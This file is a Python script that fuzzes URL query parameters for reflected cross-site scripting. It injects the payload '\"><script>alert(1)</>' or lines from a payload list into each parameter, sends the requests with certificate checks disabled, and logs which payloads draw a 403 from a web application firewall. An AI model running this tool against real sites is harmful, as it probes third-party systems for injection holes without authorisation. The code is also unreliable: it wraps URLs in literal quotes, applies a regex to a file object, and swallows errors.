import requests
import sys
from urllib3.exceptions import InsecureRequestWarning
import re
import argparse

requests.urllib3.disable_warnings()

url = sys.argv[1]
if not '"' in url: # put the input inside "
    url = '"' + url + '"'
print("url type: ",type(url))
if ".txt" in url: #verify if it's a list or not in the url
    url = open(sys.argv[1], "r")
 #   url = open(sys.argv[1],"r")
print("analyzing ", url)
scripts = "\"><script>alert(1)</>"
try: #if it's a list, scripts will be loaded from list. if nothing is specified, scripts is already defined in this script
    if ".txt" in sys.argv[2]:
        scripts = open(sys.argv[2], "r")
    else:
        scripts = "\"><script>alert(1)</>"
except:
    pass
regex1 = '\=[*\w]*'  # all values on url
result1 = re.findall(regex1, url, re.DOTALL)
print(result1)
if len(result1) > 1:
    try:
        print("values found in the url..", result1[0][1:], result1[1][1:])
        print("analyzing",result1[0][1:]) #print the first value present in the url
        firstone = url.replace(result1[0][1:], scripts) #replace the first value with the script given and adjust the url
        print(firstone)
        headers = {'User-agent': 'Mozilla//10.0', }
        r = requests.get(url=firstone, verify=False, headers=headers) #make the request to the url adjusted
        print(r.status_code, "==>", r.content) #print server response to the request and the content
        print("analyzing", result1[1][1:]) #print the second value present in the url
        secondone = url.replace(result1[1][1:], scripts)
        secondrequest = requests.get(url=secondone,verify=False, headers=headers)
        print(secondrequest.content)
    except:
        print("there was only 1 value..")
else: #if only 1 value is present in the url
    print("analyzing", result1[0][1:])
    if '\"' in url:
        url = url.replace('"', "") #take off the " inside the url if present
        if ".txt" in sys.argv[2]: #check if it's a list given as second argument, in this case the scripts
            scripts = open(sys.argv[2], "r") #open the list of payloads
            for payloads in scripts:
                first_ = url.replace(result1[0][1:], str(payloads)) #replace the value with each of the scripts given and iterate through them
                headers = {'User-agent': 'Mozilla//5.0', }
                requester = requests.get(url=first_, verify=False, headers=headers)
                if requester.status_code == 403: #if forbidden, only print the response and the payload that triggered the waf
                    print("403", "==>", first_)
                else:
                    print(requester.status_code, "==>", "tested", first_) #if it's not forbidden, print the payload tested
                #print(requester.status_code, "==>", requester.content, "tested with: ", payloads)
        else:
            scripts = "\"><script>alert(1)</>" # if it's not a list or a txt file is not given, test with the payload by default defined in this script
        firstone = url.replace(result1[0][1:], str(scripts))
        headers = {'User-agent': 'Mozilla//5.0', }
        othercondition = requests.get(url=firstone, verify=False, headers=headers)
        print(othercondition.status_code, "==>", othercondition.content)
sys.exit()
    #print(url.replace(result1[1][1:], scripts))
#print(url.replace(result1[0][1:], scripts))
#print(url.replace(result1[0][1:], scripts,result1[1][1:],scripts))
#until end of 1st parameter
